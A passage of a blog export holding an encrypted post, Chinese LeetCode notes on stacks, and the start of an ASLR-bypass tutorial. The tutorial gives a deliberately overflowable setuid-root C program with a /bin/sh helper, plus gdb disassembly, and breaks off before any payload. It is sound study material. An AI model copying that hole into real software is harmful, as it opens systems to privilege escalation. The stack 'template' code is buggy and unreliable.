79884185b11744d557b3932e439a0512c2df64aae55c04c4c6729fad1b1aae1659a1dc4315bc1a2e8806d74d99457fc2285fbdcacd1af22f661aa08e5262ec4d7294b150710aa4a39331474a754e2e2e95f7bad9a3fd6dde823e18e5666a4307502c5f1990703913a125f69548053a3deca570162386128c718c8689bb36536949f617b7bde8ad55a697fbde81a0a929a9c4be2c26d22dfc98398c8aa7e6269be929cc31b3695a570820af7c0923bf7f8f06336e8729eec841cfafb427586c3bc85a7b863bf396cf27d81c1a702429b839035e302a8bfc6692ae5d2cbcdc3c669b4bf530a5830dd53e8b8747450a9701553ad506a2dd61f1462a2cbeb05cd53125519842b9ba6ea5767c2831185041bfe8ef99ae01b0d61154477618811ff22ce9327f7385d022204903e6c248d7a04d3876a62f3417c76fb00c4ab9343430bf6874a1c3dfa07aab8d107818246427ba3267b876318a6f3a5df207430f268e6c5c4258a1ac2cd8cc972b8c178fc7ec36ef74b38588db2ba42a90898479fc2926757d5b4a4f81bda40377ad8d1920de74631eb874c1998e7d7afd995f6912b48f1e143a6798362678a8cc35caa805e7e417f51be0f5bdc7675662b6f0e789da3a574dca0fed06b190d8efc27f3fdb946a87bb3288a51f44fae15fb8e0983976329066626b0df84a21c7643ee75bdebe6b130222e34a0d7e4c6ab357a0eb8134d9f8d3667912de27dc6b91e8fb0d57658ba1098cfc6adc35a5afdac6dc28d60856f336be8810f4e7afa7dd3ec814fd15b68d9cb3c982f4474c58a878457930284fd540afa832f34b6702ecd1dd62f90b4f3ce795466f210c1e806474f8f22191634358e21c6148662d308e647b4d846b481c460c5e5eaebe60b75c8f37357197e180fa7cb94e8cf877ae03c90bb184566dd10cfe1883ffaca9853735893a4e611b9012a84999b6fd84008b0b55b2f04e23166bbcef06410acd16553e4ee464686b5194cc7572d8f1fa3729d9740613300436dbc71a696bc08d581bd2ae7daf3ce93584427ab334d6fc266a628d8fa65fe74383a3c447b46899313171260e54bafab4fd049bdd2641064bd61da916fe3e6c5429a643dcf35839e6789c3795fa1b51b42ac3047a107c667a00733b2d9d86601c117191907e4a20a79ce875a003327d4eccdf0f8f84af19759e115394c215ca4abaf9817ad44d043d8580c4d10785b3426fa2827d7ba8dccbb7c3a09ab4448fa45658568ef5f81a89360b69a9e5f5550344a9075ff6a5edededb0960016b09d55c7db58de5c95712adcff50468dd7b6858f4a7d54f7daf6a1cec0d6e475485e93e8833aca3ef7814b7b626b2bc5d42ff8d96ea247ac65e5ba95ddf58a2bd184c09e26c8e34bc31dbe19237d492c69a3dfae85ba3667bc282e06fb2d38d7b819a1eb3bd3ef74d3384deebcb1938a2940e3f055764498d942ab32d3a02a191680d7e96cc70763817d72c895d3f5801ac5eeb4ff937731d6da6c999f362555e59dad6e5245a94e4260c850d8b0e4e239d73dea632f021a077d97bc3d5f5d001627eda982dc8d9dd5cd453e144524ed924bd317cd5a66df3450c13de4ad466c388b6fd11aba0f766863178b18a45cad0b838ec4d347de63cbbd3d1bc410e074aa3462ee7b8da06a300565e208161b232f89d47a125ac1503b7a7b6a4159ab81e910cd3ea1c9243a267b12f08e0b48a416239c301f2cdc2f5718b63147badeece27482ab1560797d83b4731ed59fec26ec5a0195d73d2623d1b9608fecba07e44cf4739b0ae63f57352ccdc9c09b2864bb5cf88f8e2ab8698d06e2e4ebc58e8d6207aebebde8a77bd19f259d6adb0454e7bbd3d40cb3b5cc4781805d7c5e2d30beaec73d699224c8eb2945f292f0a4bc1d9d0a0a9a8433eaa402d47142d2c82d66a4874a1fefd90fdba47dfefffd3a7d9e26806fd2cc73c0aa6a09d43ca1ffa031fd245bfb03a5f635127c393f3db58f08f0d3454f6857ff38328e7f91c5a1551147d0fef0e73a7ef6bfcd2a56257c552190881606eeeab5d08a978f97015af4e514f04051015c8bbe7e3f8bcec0ef91577e92d1157d6c7b5874bf472c03ac66c7ac8e7a449c9c230a7694f41f75ac0f286ca5fdb93609093b4c25ac67d572ffceab287cc893bd73c83ae9729b7ab6f0ed0b4bb44ce7d7537d01dd6d55d88ac154068a5608f36465edc5fe3fb0c04c1d695be27674122ff24eb4d666eee9087bcce241e0dba706ed2f1c0359b733cf6cf841a20e8c834360f2d651d29e35be609c5ef18eb0ead898b2f2cd713a72c476c18d9d7a1694dc4f5d153a5286702b64abd633058638b9083e582ed27fcbbab50ca9fcccd8d131b6a711f847d7a939b7c64fa6b2abab709e4aa516afa0eaf4281c18f04c3eca3bc567348dd067d39d8b09322f786d27a19ebbc6ce724f37e0dcad4cdb7c0ea05e8b140b086d7a8a245136a3b77931ee00135406b240b6e88dd81f43e4aff85bf3baaea3fc67cfe18dccf5ac79105ae1df824880dd2ba084e562a67a1713ff4eddc0dfbc95c09d0c86b9fedf802af076658982be47131e19b88c2c5a8d00c5eedffdbf94f1bad582ea9782a4927969b1a59f2976fb181cde435398e80a3098c24afa12564a8c8912529cba2482a330ad2243a83299be3f322c1de42a1648f74113a6d031a7551190fa58bf4a3cf1e89e07c1e2d7021e0fe58c0889ebc629a104132a44a762c71e9417107d6c5ce930151ae1627f39d4d7544c4133f383d166c152f742b0f796a86a9dc4cec258dea3a62dc44c8dbb4f360f8c99558f47ec23b0c5d0195c16738a7768770bf145c0cd9cec2e5efc1ae21e85a09a2db8ed1c17287ec56ea9ad977d1dd1f33393742205cdb221b28487f7f91718cd00f0400bbdcc273a4cc0822cbba659dae758785dc59c08c2f32f83093a718d2cea193f52876b5480bdc7e3ac3348119b3c8f7a6046fb7a33740fee9d565f1faceb938db4274f34795f024960c3b13dc385e91775c39ac73c9f3702ab9912cb7c2268aac98bc6bd7dbd9a622e8f731cb38973231b16c6aa377839a54855c6ed42b4d0760c14fe454b057ceb17c8b21ece43c3bff8d98fe3351f8ffbc0ecde2ecf43db49b353118448f67c6ebeed0c317d2c3485e370b2b7afdcfe6c3d38530c1b30d27d9642a8a31288c24d1dc798e49220f3a390adb970378d5dfe33bd7c41a235f0954ad87d6fffac626bd34cdc76ffee9f08788713b463373e11f535119a432efe56e54cc5f077fd34e3b60d257394a74c4ae3db4fcbe451ed4e9e5ee260079c0f049b16856aaacd8d17a387182cae10941f1be95e70fae3ab3b1110dac7c20b4b8485492003cbe74b7814d5febdb33c1ad681e602f6bddd308bca8d8bc5f1bc379398174b07f6e7fb7ddfa79a58b773dd1c0bd999337fc74d90d1c2feeaad0a8e2bd6725e7fabcf45d092f13a30974e3243ca87c0276c7bd630764424150a596740a43336e37f93939f5a093f40a7ca7db653acecc57fb07381b9828043975c32cc57c2106cb2cff0a231e4bfea58975e1b57f634a091329d184ef4001322950e0162968eedb475512cd5749fe3735d7112bd93565dcc2fc21966d630e5705848cb94911a335474d67d04ff4b2f9c047329de7423e0025d015938ca2278cfa82e0967cf1bf59d4034e2f964573ad7e11f7554af212b4a1580069b630f678baab0ff9f151a2244d5d3fdb1fe47d06690f06bde4c81445b48baa11fd674b0493c8505beefe6f75803d525d7496b28e07d06c8c5fcf6e16a61df6231717fa9b6ce22de0c115bca4b1bf3ddbddf98b49fdba53cd318d2a4d4dd641169e4e6ce34a23accc3cc82e6df6280782aff030e2d22698074f07382a8eb7e728ee5be3125d142b19d13507ac9648763ef5ee0a18d2c91bb22fdf644daccd72cedc277833566b9cc47e3eb594a99b58b5cb433a09a206427d2e88a861d57430c5887b544ae1d04ac49460daf0c7e3ca9fd3af2e5a428c7fdfc7676abaeba3b77131a30e951ea15bc65c642a60b8731b9d63aaebec93733cf3f1c03e20231a439974c9dc0abd704aecfa02912aa8507ffe606be554af1cdfdf23f95f21a76508cf640b58cecec91344ae3fe93e8eaa04ed032416dca160bcf74c47be2ddf8add893d54081a6ecc18880a85edbe5be487e745a019d433f40bb6cc975e2e3208bbb6f3b6729d4bfe81139196d05be474b95c841b729f518b6fb63f2528da3db2d01fd5f73f86957935b40d03d9ff8441565bd5ff593fd5f15313ae503672e976f4a231c25df3a270fd260a0b66eda49e7cdb9ad82fb73a3da9aed5cd46b21b8fa22bf8c75e98c9ae167bf13d48062d3ffac466e5d557524a0b8567e41f6cedefe0079bb81192997bf3278d54bfe62234ed498162d6b289f15733b7b2b8e662485835db4f09574b3c9b004334f857a0d0290d0b8fcacc25c4caca9422ea613497c7b43458bf25910ca2897a763f1398972af92e12e454cd6dde4512d46e9e882dbc5c9f9a2acb6bce0ea8547cffc5b0b3c94055ede3f8a9d30b2b8f0aa8968eaccb19a79d8d3cb0df29adde262b29e17590768f7b456d25648c53f0a1dfdf74050e389d41c7be3030704ab32125db101aec142d404358ba3b49caa99d8b20ce2b0b94f86f403f284a2bdaf034a9f5befeeab582791ca13a909bfb7ab9008ef9e99e9fc5a1e88802a0ccb5b9a05d8aa479ef9c7c5b9a409c977897b3d9bbf9684ed4c183cfbeebd60b8f1771688f68a2080d4eea01fde5891eff23d85b6b1857de11ebe379fcaed110c845b341f834529c2e4f7eabfdce1d95581622bfe2ed0281ca02bee2e34a05a507f56643a4aff9fa3adaf9c71c75ef9ddafcc1beb7e04443d0bea6fab85079671ea07e15786824f94e8ec45ceeab750692526d0be58fc5c8a461894f382e61ae08606cdfce969e711925d2c84e1bce7feae1bf380c051530fd61aa50077a5d70ef78866fcfcd4d2efa2086c3edc9e4c5ae423950057712eb0a38e8166d60b65e4b993ecd9e9b5f16e30adad7de2f93fab4eaaae51f38fd7316391c58ba49a992be73b97e032aafe210d2d6d9bfe5f3ed6f2c5c388194f26e282a3da7a62131c508ef9bae37a5650f7b580157227892be5ca109cde06bd17d9b2a3bd72fd6b2151befe8a3926cd4cb46299d3f8eb7f6a075e2e6e17868d0fc7a184bbb76d76935ce8d1a6f6580723eccf4bb3c32512d3f9664ca437d8ba047357557552a185953f9bb50be8fa16d4a5d5efb3ead6be8a88e8ba77f53f011fcc09b18ff44713ee1</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记7 - 栈结构总结</title>
    <url>/2024/03/22/leetcode-stack/</url>
    <content><![CDATA[<h1 id="Leetcode笔记7-栈结构总结"><a href="#Leetcode笔记7-栈结构总结" class="headerlink" title="Leetcode笔记7 - 栈结构总结"></a>Leetcode笔记7 - 栈结构总结</h1><p>栈的特点是：先进后出，后进先出。</p>
<p>遇到需要先进后出的题，优先考虑栈结构。例如：匹配括号等。</p>
<h2 id="1-辅助栈"><a href="#1-辅助栈" class="headerlink" title="1. 辅助栈"></a>1. 辅助栈</h2><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><p>这里需要考虑合法括号的特点是啥：</p>
<p>例如 () [] {}都是合法括号， (())也是合法括号，但是如果认为左括号和右括号数量相等就为合法括号，是错误的，因为：(([))]也不合法</p>
<p>(([))] 不合法的原因是： [的右边跟上了一个右小括号），但是如果[的右边跟上的是一个左小括号(，那么括号可能是合法的，因为：(([()]))</p>
<p>所以合法括号的特点是：</p>
<ul>
<li>左右括号数量相等</li>
<li>左括号的右边不能紧跟着非同类的右括号</li>
</ul>
<p>但是这样考虑太复杂了，我们需要换个角度考虑，从括号闭合的角度思考：<strong>当括号内部没有子括号，或者括号内部的子括号全部闭合时，我们认为括号合法</strong>。</p>
<p>因此，<strong>最里面的括号需要先闭合</strong> —— 可是一个数组里，我们往往是按顺序遍历数组的，如果最里面的括号需要闭合，意味着我们需要考虑栈，因为栈是先进后出，后进先出的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：s = &quot;()&quot;</span></span><br><span class="line"><span class="comment"># 输出：true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入：s = &quot;(]&quot;</span></span><br><span class="line"><span class="comment"># 输出：false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">## ([&#123;&#125;()])</span></span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        hashmap = &#123;<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> hashmap: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c != hashmap[stack.pop()]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(stack) == <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h2 id="2-单调栈"><a href="#2-单调栈" class="headerlink" title="2. 单调栈"></a>2. 单调栈</h2><p>单调栈是用来解决“<strong>下一个更大</strong>”类型的题目。</p>
<p>一个数组，要求你找到每个元素对应的下一个更大的元素。</p>
<p><strong>核心思路：</strong></p>
<ul>
<li>思考这样一个数组[5,4,1,2,3,4,5,6]，从后往前思考，nums[1]&#x3D;4的下一个更大元素是nums[6]&#x3D;5，而nums[0]&#x3D;5的下一个最大元素是nums[7]&#x3D;6</li>
<li>实际上在考虑nums[1] 的下一个最大元素为nums[6]的时候，nums[1]已经和nums[2], nums[3], num[4], nums[5]做过比较了 —— nums[1] 比它们都大</li>
<li>因此继续考虑nums[0]的时候，nums[2], nums[3], nums[4], nums[5]都不必再考虑了，只需比较它和nums[1]，由于nums[0] &gt; nums[1]，因此下一个直接比较nums[0]和nums[6]就好了，栈里的其他元素都要pop掉。</li>
</ul>
<p><strong>模板：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数组： nums = [4,1,2,3,4,5]</span></span><br><span class="line">size = <span class="built_in">len</span>(nums)</span><br><span class="line">stack = []</span><br><span class="line">keep = <span class="built_in">dict</span>&#123;&#125;</span><br><span class="line"><span class="comment"># 从后往前遍历 + 从后往前入栈</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># 如果栈为空，或者当前的元素比栈顶元素大的话，把栈顶元素pop出来，直到找到不比当前元素大的，或者直到栈为空</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stack <span class="keyword">or</span> nums[i] &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">        stack.pop()</span><br><span class="line">    <span class="comment"># 这个时候记录一下当前元素的下一个最大值</span></span><br><span class="line">    keep[nums[i]] = stack[-<span class="number">1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">    <span class="comment"># 把数组元素从后往前入栈</span></span><br><span class="line">    stack.append(nums[i])</span><br></pre></td></tr></table></figure>



<h3 id="496-下一个更大元素-I"><a href="#496-下一个更大元素-I" class="headerlink" title="496. 下一个更大元素 I"></a><a href="https://leetcode.cn/problems/next-greater-element-i/">496. 下一个更大元素 I</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums1 = [4,1,2], nums2 = [1,3,4,2].</span></span><br><span class="line"><span class="comment"># 输出：[-1,3,-1]</span></span><br><span class="line"><span class="comment"># 解释：nums1 中每个值的下一个更大元素如下所述：</span></span><br><span class="line"><span class="comment"># - 4 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1。</span></span><br><span class="line"><span class="comment"># - 1 ，用加粗斜体标识，nums2 = [1,3,4,2]。下一个更大元素是 3。</span></span><br><span class="line"><span class="comment"># - 2 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nextGreaterElement</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        stack = []</span><br><span class="line">        keep = &#123;&#125;</span><br><span class="line">        n = <span class="built_in">len</span>(nums2)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> nums2[i] &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">                stack.pop()</span><br><span class="line">            keep[nums2[i]] = stack[-<span class="number">1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            stack.append(nums2[i])</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums1:</span><br><span class="line">            res.append(keep[num])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制学习笔记1-ASLR绕过</title>
    <url>/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="二进制保护机制原理和绕过技巧"><a href="#二进制保护机制原理和绕过技巧" class="headerlink" title="二进制保护机制原理和绕过技巧"></a>二进制保护机制原理和绕过技巧</h1><h2 id="0x00-工具"><a href="#0x00-工具" class="headerlink" title="0x00 工具"></a>0x00 工具</h2><ul>
<li><strong>peda</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>readelf</strong></li>
</ul>
<p>readelf的作用是<strong>用来查看当前elf文件的符号表</strong>，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br></pre></td></tr></table></figure>



<h2 id="0x01-ASLR"><a href="#0x01-ASLR" class="headerlink" title="0x01 ASLR"></a>0x01 ASLR</h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
<p><strong>绕过ASLR核心点</strong> </p>
<ul>
<li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
<li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/65fc5d2f9f345e8d03706af0.png"></p>
<p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706da2.png"></p>
<h2 id="0x02-return-to-plt技术"><a href="#0x02-return-to-plt技术" class="headerlink" title="0x02 return-to-plt技术"></a>0x02 return-to-plt技术</h2><h3 id="2-1-背景知识"><a href="#2-1-背景知识" class="headerlink" title="2.1 背景知识"></a>2.1 背景知识</h3><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
<h4 id="2-1-1-Linux内存布局"><a href="#2-1-1-Linux内存布局" class="headerlink" title="2.1.1 Linux内存布局"></a>2.1.1 Linux内存布局</h4><p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706c09.png"></p>
<ul>
<li>.text 汇编代码</li>
<li>.data 无初始值的数据（静态变量，全局变量）</li>
<li>.bss 有初始值的数据 （静态变量，全局变量）</li>
<li>heap 堆</li>
<li>shared object 共享对象区域（动态库所在）</li>
<li>stack 栈</li>
<li>kernel-area 内核区域</li>
</ul>
<h5 id="2-1-2-静态函数库与动态函数库"><a href="#2-1-2-静态函数库与动态函数库" class="headerlink" title="2.1.2 静态函数库与动态函数库"></a>2.1.2 静态函数库与动态函数库</h5><p>静态函数库 —— 在程序运行前就已经被加载到目标程序里了</p>
<p>动态函数库 —— 在程序启动的时候被加载</p>
<p>不同于静态库的是，<strong>共享库的text段在多个进程间共享</strong>，<strong>但它的数据段在每个进程中是唯一的</strong>。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] </p>
<p><font color=red><strong>这句话非常重要！</strong></font></p>
<h5 id="2-1-3-PIC（位置独立代码）"><a href="#2-1-3-PIC（位置独立代码）" class="headerlink" title="2.1.3 PIC（位置独立代码）"></a>2.1.3 PIC（位置独立代码）</h5><p>位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p>
<p>共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p><strong>简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！</strong></p>
<h3 id="2-2-GOT（全局偏移表）-PLT（过程链接表）"><a href="#2-2-GOT（全局偏移表）-PLT（过程链接表）" class="headerlink" title="2.2 GOT（全局偏移表）&amp; PLT（过程链接表）"></a>2.2 GOT（全局偏移表）&amp; PLT（过程链接表）</h3><h4 id="2-2-1-GOT"><a href="#2-2-1-GOT" class="headerlink" title="2.2.1 GOT"></a>2.2.1 GOT</h4><p>全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。</p>
<h4 id="2-2-1-PLT"><a href="#2-2-1-PLT" class="headerlink" title="2.2.1 PLT"></a>2.2.1 PLT</h4><p>过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。<strong>存根代码在动态链接器的帮助下，解析函数地址</strong>并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。</p>
<p>简言之：</p>
<ul>
<li>第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中</li>
<li>以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址</li>
<li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
</ul>
<p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="3-1-漏洞代码"><a href="#3-1-漏洞代码" class="headerlink" title="3.1 漏洞代码"></a>3.1 漏洞代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-2-编译"><a href="#3-2-编译" class="headerlink" title="3.2 编译"></a>3.2 编译</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">gcc -g -fno-stack-protector -o vuln vuln.c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-调试"><a href="#3-3-调试" class="headerlink" title="3.3 调试"></a>3.3 调试</h3><p>查看main函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000000118b &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000118c &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000118f &lt;+4&gt;:     sub    rsp,0x120</span><br><span class="line">   0x0000000000001196 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x000000000000119c &lt;+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">   0x00000000000011a3 &lt;+24&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x00000000000011aa &lt;+31&gt;:    mov    rax,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x00000000000011b1 &lt;+38&gt;:    add    rax,0x8</span><br><span class="line">   0x00000000000011b5 &lt;+42&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000000011b8 &lt;+45&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011bf &lt;+52&gt;:    mov    rsi,rdx</span><br><span class="line">   0x00000000000011c2 &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011c5 &lt;+58&gt;:    call   0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011ca &lt;+63&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011d1 &lt;+70&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011d4 &lt;+73&gt;:    call   0x1040 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011d9 &lt;+78&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011de &lt;+83&gt;:    leave  </span><br><span class="line">   0x00000000000011df &lt;+84&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>查看shell函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble shell</span></span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000116a &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:     lea    rax,[rip+0xe90]        # 0x2004</span><br><span class="line">   0x0000000000001174 &lt;+11&gt;:    mov    rdi,rax</span><br><span class="line">   0x0000000000001177 &lt;+14&gt;:    mov    eax,0x0</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:    call   0x1050 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000001181 &lt;+24&gt;:    mov    edi,0x0</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:    call   0x1060 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>找到’&#x2F;bin&#x2F;sh’的地址</p>
